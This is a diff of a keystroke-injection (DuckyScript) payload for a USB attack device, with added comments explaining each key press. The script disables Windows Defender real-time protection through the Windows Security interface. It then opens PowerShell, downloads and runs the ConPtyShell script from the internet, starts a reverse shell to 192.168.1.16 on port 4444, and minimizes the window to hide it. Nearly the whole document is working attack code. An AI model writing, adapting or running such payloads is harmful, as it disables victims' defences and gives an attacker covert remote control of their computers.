@@ -1,14 +1,10 @@
-REM Only Windows 10 and 11 fully supported. Maybe windows 7?
-REM Please change the IP-ADDRESS-HERE and PORT-HERE to the ip address and port number of your Linux distro, WSL works!
-REM There is surely a faster way to disable Windows Defender but I have not found one yet. :/
-REM Adjust the delays to your preference, the faster the computer, the lower the delays need to be
+GUI(open the window search)
+DELAY 500( delay time 500 is equivalent to 0.5 milliseconds)
+STRING virus and threat(type in the search bar)
 DELAY 500
-REM Disable Windows Security
-GUI
+ENTER(enter button like the keyboard)
 DELAY 500
-STRING virus and threat
-DELAY 500
-ENTER
+TAB(tab button in the keyboard)
 DELAY 500
 TAB
 DELAY 500
@@ -16,28 +12,26 @@ TAB
 DELAY 500
 TAB
 DELAY 500
-TAB
+ENTER
+DELAY 500
+SPACE(spacebar in the keyboard)
+DELAY 500
+LEFTARROW(left arrow key in the keyboard)
 DELAY 500
 ENTER
 DELAY 500
-SPACE
+ALT F4(alt+f4 in the keyboard)
 DELAY 500
-LEFTARROW
+REM Enter Powershell and type in the script(The REM command is just a comment in the payload)
+GUI R(run command dialog)
 DELAY 500
-ENTER
-DELAY 500
-ALT F4
-DELAY 500
-REM Enter Powershell and type in the script
-GUI R
-DELAY 500
-STRING powershell
+STRING powershell(it will type the powershell in the input area)
 DELAY 500
 ENTER
 DELAY 500
-STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell YOUR-IP YOUR-PORT
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.16 4444
 DELAY 500
 ENTER
 DELAY 500
-GUI down
+GUI down(to minimize the powershell)
 DELAY 500
